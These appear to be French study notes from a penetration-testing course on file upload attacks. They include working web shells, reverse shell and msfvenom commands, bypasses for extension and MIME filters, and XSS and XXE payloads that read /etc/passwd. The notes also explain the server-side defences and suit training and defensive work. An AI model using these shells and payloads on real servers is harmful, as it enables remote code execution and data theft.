# File Upload Attacks

## Web Shells

Une fois la vulnérabilité confirmée, on peut uploader un **web shell** ou un **reverse shell** dans le même langage que l’application (ex: PHP).  

Exemples :  
- `phpbash.php` (terminal-like shell semi-interactif)  
- Web shells de **SecLists** (`/opt/useful/seclists/Web-Shells`)  

Après upload → cliquer sur *Download* → interaction directe avec le serveur sous l’utilisateur `www-data`.

### Custom Web Shell

On doit savoir écrire un web shell simple au cas où aucun n’est disponible en ligne.  

Exemple PHP :  
`<?php system($_REQUEST['cmd']); ?>`

Uploader `shell.php`, puis exécuter avec :  
`http://SERVER/shell.php?cmd=id`  
→ Retourne `uid=33(www-data) gid=33(www-data)`.

Astuce : afficher en *source view* (`CTRL+U`) dans le navigateur pour voir le rendu brut.

Exemple ASP.NET :  
`<% eval request('cmd') %>`

⚠️ Certains serveurs désactivent les fonctions utilisées (`system()` par ex.) ou bloquent via un WAF → nécessitent des techniques avancées

## Reverse Shell

Un reverse shell permet une connexion sortante depuis le serveur vulnérable vers notre machine.  
Exemple fiable : **pentestmonkey PHP reverse shell** (aussi dispo dans SecLists).  

Modifier dans le script :  
`$ip = 'OUR_IP';`  
`$port = OUR_PORT;`

### Étapes :
1. Lancer un listener :  
   `nc -lvnp OUR_PORT`
2. Uploader le reverse shell modifié.  
3. Visiter son URL.  
4. Résultat :  
   `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

## Générer un Reverse Shell avec msfvenom

On peut générer un reverse shell custom dans plusieurs langages.  
Exemple PHP :  

`msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

Puis :  
`nc -lvnp OUR_PORT`  
→ Connexion reçue depuis le serveur vulnérable.

## Ressources

- PHPBash : [https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)  
- SecLists Web Shells : [https://github.com/danielmiessler/SecLists/tree/master/Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)  
- Pentestmonkey PHP Reverse Shell : [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

---

# Client-Side Validation

## Principe

Beaucoup d’applications web se reposent uniquement sur une validation **côté client** (JavaScript) pour limiter les types de fichiers autorisés (souvent images).  

➡️ Problème : tout ce qui s’exécute côté client est **sous notre contrôle**.  
➡️ Résultat : si aucune validation n’est faite côté serveur, on peut forcer l’upload d’un fichier arbitraire (ex : web shell).

## Exemple de Scénario

- Fonctionnalité : *Profile Image Upload*.  
- Le sélecteur de fichiers ne montre que `jpg`, `jpeg`, `png`.  
- Si on choisit un `.php` → message *Only images are allowed!* et bouton désactivé.  

⚠️ Comme il n’y a pas de requête envoyée au serveur à ce stade → toute la validation est uniquement en front-end.

## Méthode 1 : Modifier la Requête Backend

1. Uploader normalement une image et capturer la requête avec **Burp**.  
   Exemple :  
   `POST /upload.php` avec `filename="HTB.png"` et contenu PNG.  

2. Modifier la requête :  
   - `filename="shell.php"`  
   - remplacer le contenu par notre web shell PHP.  

3. Envoyer la requête modifiée.  

→ Résultat : réponse *File successfully uploaded* → exécution de `shell.php`.

## Méthode 2 : Désactiver la Validation Front-End

1. Ouvrir l’inspecteur (`CTRL+SHIFT+C`) sur l’élément *Upload*.  

   Exemple d’input :  
   `<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">`

2. Supprimer `onchange="checkFile(this)"` (et éventuellement l’attribut `accept="..."`).  

3. Le code JS de validation :  
   `function checkFile(File) {  
       if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {  
           $('#error_message').text("Only images are allowed!");  
           File.form.reset();  
           $("#submit").attr("disabled", true);  
       }  
   }`

   ➝ On empêche l’exécution de cette fonction en supprimant la référence dans l’HTML.  

4. Re-sélectionner le fichier `.php` → upload passe sans restriction.  

## Vérification

Après upload, vérifier le code HTML pour retrouver l’URL de notre shell :  

`<img src="/profile_images/shell.php" class="profile-image" id="profile-image">`

En cliquant sur ce lien → exécution du web shell et **RCE**.

## Points Clés

- Toute validation côté client peut être **contournée** (modification requête / modification code HTML/JS).  
- Seule la **validation côté serveur** est fiable.  
- Avec Burp + DevTools, on peut forcer l’upload de n’importe quel fichier.

---

# Blacklist Filters

## Exemple de Validation

Exemple de code vulnérable :

`$fileName = basename($_FILES["uploadFile"]["name"]);`  
`$extension = pathinfo($fileName, PATHINFO_EXTENSION);`  
`$blacklist = array('php', 'php7', 'phps');`  

`if (in_array($extension, $blacklist)) {`  
&nbsp;&nbsp;&nbsp;&nbsp;`echo "File type not allowed";`  
&nbsp;&nbsp;&nbsp;&nbsp;`die();`  
`}`  

Faiblesses :  
- La comparaison est **sensible à la casse** → `pHp` peut passer.  
- La liste n’est **pas exhaustive** → d’autres extensions PHP (ex: `.phtml`) ne sont pas bloquées.  

## Technique 1 : Fuzzing des Extensions

1. Capturer la requête d’upload avec Burp (`/upload.php`).  
2. Envoyer dans **Intruder**, cibler l’extension (ex : `"HTB.php"`).  
3. Charger une wordlist d’extensions PHP (ex : **PayloadsAllTheThings** ou **SecLists**).  
4. Lancer l’attaque.

Résultat :  
- Les requêtes renvoyant *Extension not allowed* = bloquées.  
- Celles avec *File successfully uploaded* = extensions **autorisées**.  


## Technique 2 : Exploiter une Extension Non-Blacklistée

Exemple : `.phtml` (souvent interprété comme PHP).  

- Reprendre la requête depuis Intruder ou Repeater.  
- Remplacer `shell.php` par `shell.phtml`.  
- Mettre le contenu d’un web shell PHP basique.  

Exemple de shell minimal :  

`<?php system($_REQUEST['cmd']); ?>`  

Requête :  
- `POST /upload.php` → réponse *200 OK* → fichier uploadé.  

## Vérification

Aller sur l’URL :  
`http://SERVER_IP/profile_images/shell.phtml?cmd=id`  

Résultat attendu : exécution de la commande (`uid=33(www-data)`).

## Points Clés

- Les **blacklists sont faibles** car il existe trop d’extensions alternatives.  
- Les bypass possibles incluent :  
  - Casse différente (`pHp`, `PhP`).  
  - Extensions alternatives (`.phtml`, `.php5`, `.php7`, etc.).  
- La bonne pratique = utiliser une **whitelist stricte** côté serveur (ex : uniquement `.jpg`, `.png`), combinée à une vérification **MIME type + contenu**.  

---

# Whitelist Filters

## Principe

Contrairement à la **blacklist**, la **whitelist** valide uniquement les extensions autorisées (ex : `.jpg`, `.png`).  
C’est en général plus sécurisé, mais de mauvaises regex ou des configurations serveur peuvent rendre le système vulnérable.

## Exemple de Validation

Exemple de code PHP utilisant une whitelist simple :

`$fileName = basename($_FILES["uploadFile"]["name"]);`  

`if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {`  
&nbsp;&nbsp;&nbsp;&nbsp;`echo "Only images are allowed";`  
&nbsp;&nbsp;&nbsp;&nbsp;`die();`  
`}`  

Faiblesses :  
- Le regex n’impose pas la fin du nom de fichier.  
- `shell.jpg.php` peut passer le filtre.  

## Technique 1 : Double Extensions

- Uploader `shell.jpg.php`.  
- Le script passe le contrôle (il contient `.jpg`) mais est exécuté comme `.php`.  

Exemple de web shell :  

`<?php system($_REQUEST['cmd']); ?>`  

Requête : `POST /upload.php` → réponse *200 OK*.  
Aller sur `http://SERVER_IP/profile_images/shell.jpg.php?cmd=id` → exécution de commande.

## Regex Strict et Limitations

Un code plus strict utiliserait :  

`if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }`  

Ici, seul l’extension **finale** compte. Le bypass avec double extension ne fonctionne plus.  
Mais d’autres failles (config serveur, injection de caractères) restent possibles.

## Technique 2 : Reverse Double Extension

Exemple de config Apache vulnérable (`php7.4.conf`) :

`<FilesMatch ".+\.ph(ar|p|tml)">`  
&nbsp;&nbsp;&nbsp;&nbsp;`SetHandler application/x-httpd-php`  
`</FilesMatch>`  

Sans `$` en fin de regex, **tout fichier contenant `.php` est exécuté**.  

Exemple :  
- Uploader `shell.php.jpg`.  
- Le regex du serveur l’interprète comme `.php`.  
- Résultat : code exécuté malgré la whitelist stricte.

## Technique 3 : Injection de Caractères

On peut injecter des caractères spéciaux pour tromper l’interprétation :  

- `%20`  
- `%0a`  
- `%00` (null byte, fonctionne avec PHP ≤ 5.x)  
- `%0d0a`  
- `/`  
- `.\`  
- `.`  
- `…`  
- `:` (utile sur Windows, ex : `shell.aspx:.jpg`)  

Exemple : `shell.php%00.jpg` → interprété comme `shell.php`.  

## Génération d’une Wordlist

Petit script Bash pour générer des permutations :  

`for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do`  
&nbsp;&nbsp;&nbsp;&nbsp;`for ext in '.php' '.phps'; do`  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`echo "shell$char$ext.jpg" >> wordlist.txt`  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`echo "shell$ext$char.jpg" >> wordlist.txt`  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`echo "shell.jpg$char$ext" >> wordlist.txt`  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`echo "shell.jpg$ext$char" >> wordlist.txt`  
&nbsp;&nbsp;&nbsp;&nbsp;`done`  
`done`  

Cette wordlist peut ensuite être testée avec Burp Intruder pour trouver des bypass.  

## Points Clés

- Les **whitelists sont plus sûres que les blacklists**, mais souvent mal implémentées.  
- Vulnérabilités possibles :  
  - **Regex trop large** (double extensions).  
  - **Mauvaise config serveur** (reverse double extension).  
  - **Injection de caractères spéciaux**.  
- Solution robuste = regex stricte **+** vérification MIME **+** analyse du contenu.  

---

# Type Filters

## Principe

Les filtres basés uniquement sur l’extension ne suffisent pas (`shell.php.jpg` reste dangereux).  
Les serveurs modernes ajoutent une vérification **du contenu** pour s’assurer qu’il correspond bien au type attendu (images, vidéos, docs).  
Deux méthodes principales existent :  

1. Validation via **Content-Type** (HTTP header).  
2. Validation via **MIME-Type** (magic bytes du fichier).  

## Exemple 1 : Content-Type Header

Exemple de code PHP vulnérable :  

`$type = $_FILES['uploadFile']['type'];`  

`if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) {`  
&nbsp;&nbsp;&nbsp;&nbsp;`echo "Only images are allowed";`  
&nbsp;&nbsp;&nbsp;&nbsp;`die();`  
`}`  

- Ici, `$type` dépend de l’en-tête **Content-Type** envoyé par le client.  
- Comme le navigateur fixe ce champ → **contrôlable par l’attaquant**.  

### Bypass

1. Intercepter la requête (Burp).  
2. Modifier `Content-Type: image/jpg` pour un fichier `shell.php`.  
3. Résultat : *File successfully uploaded* → le code s’exécute.  

Astuce : attention, une requête upload a **2 Content-Type** possibles :  
- Celui global de la requête multipart.  
- Celui de la partie fichier → c’est souvent celui-ci qu’il faut modifier.

---

## Exemple 2 : MIME-Type (Magic Bytes)

Exemple de code PHP :  

`$type = mime_content_type($_FILES['uploadFile']['tmp_name']);`  

`if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) {`  
&nbsp;&nbsp;&nbsp;&nbsp;`echo "Only images are allowed";`  
&nbsp;&nbsp;&nbsp;&nbsp;`die();`  
`}`  

- Ici, PHP lit directement les **premiers octets** du fichier (signature magique).  
- Plus fiable, mais toujours contournable.  

### Démonstration

`echo "this is a text file" > text.jpg`  
→ `file text.jpg` → ASCII text.  

`echo "GIF8" > text.jpg`  
→ `file text.jpg` → GIF image data.  

Donc en ajoutant `GIF8` au début d’un fichier PHP :  

- MIME = image/gif.  
- Extension = `.php`.  
- Résultat : le serveur exécute le PHP.  

Exemple :  
Fichier `shell.php` commençant par :  

`GIF8`  
`<?php system($_REQUEST['cmd']); ?>`  

→ Uploader.  
→ Exécution : sortie = `GIF8` (première ligne), puis résultat de la commande.  

## Combinaisons Possibles

On peut jouer sur :  

- **Extension autorisée** + MIME/Content-Type piégés.  
- **MIME valide** + extension bloquée.  
- **Content-Type valide** + contenu malicieux.  

Selon le niveau de sécurité du code, certains combos passent encore.  

## Points Clés

- **Content-Type** : faible, car côté client.  
- **MIME-Type** : plus fort, mais contournable (magic bytes).  
- **Meilleure pratique** : vérifier extension + MIME + analyser réellement le contenu.  

---

# Limited File Uploads

## Principe

Même si une application applique des filtres solides et ne permet **que certains types de fichiers** (images, docs…), cela ne veut pas dire qu’il n’y a rien à exploiter.  
Des formats comme **SVG, HTML, XML** ou certains fichiers images/docs peuvent servir à introduire des vulnérabilités : XSS, XXE, DoS…

Fuzzer les extensions autorisées reste essentiel pour identifier ces vecteurs.

## Attaque 1 : XSS via fichiers uploadés

### HTML
- Si l’appli accepte les `.html` → injection de **JavaScript** possible.  
- Exemple : page HTML malveillante → XSS/CSRF quand un utilisateur la visite.

### Métadonnées d’images
Beaucoup de sites affichent les métadonnées (commentaire, artiste…).  
On peut y placer un payload XSS :  

`exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg`  

Quand l’appli affiche les métadonnées → le JS s’exécute.

### SVG
Les fichiers `.svg` sont en XML, donc éditables :  

`<?xml version="1.0" encoding="UTF-8"?>`  
`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">`  
`<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">`  
&nbsp;&nbsp;&nbsp;`<rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />`  
&nbsp;&nbsp;&nbsp;`<script type="text/javascript">alert(window.origin);</script>`  
`</svg>`

Résultat : XSS déclenché à chaque affichage.

## Attaque 2 : XXE (XML External Entity)

Exemple SVG lisant `/etc/passwd` :  

`<?xml version="1.0" encoding="UTF-8"?>`  
`<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`  
`<svg>&xxe;</svg>`

Exemple SVG lisant du code source PHP :  

`<?xml version="1.0" encoding="UTF-8"?>`  
`<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>`  
`<svg>&xxe;</svg>`

- Affiche le contenu encodé en base64 → décodage pour lire le code source.  
- Utile pour localiser l’upload dir, extensions autorisées, schéma de nommage, etc.  

⚡ XXE peut aussi mener à **SSRF** (scanner services internes, appeler APIs privées).

## Attaque 3 : DoS via upload

- **XXE → DoS** : payloads provoquant surcharge CPU/mémoire.  
- **Zip Bomb** : archive auto-décompressée créant des PB de données.  
- **Pixel Flood** : image `.jpg/.png` dont la taille est modifiée → allocation mémoire massive (ex : 4 Gigapixels).  
- **Fichiers énormes** : absence de limite → disque saturé.  
- **Traversal malveillant** : upload vers `../../../etc/passwd` → crash possible.

## Points Clés

- Un upload limité ≠ upload safe.  
- **HTML, SVG, XML, metadata** → vecteurs XSS/XXE.  
- **Docs (PDF, Word, PPT)** → embarquent XML → potentiellement vulnérables aussi.  
- **DoS** possible via ressources trop lourdes ou bombes de compression.  

## Ressources

- [ExifTool](https://exiftool.org/) – manipulation de métadonnées  
- [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)  
- [PayloadsAllTheThings – XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)  
- [SVG Security](https://svgwg.org/)  


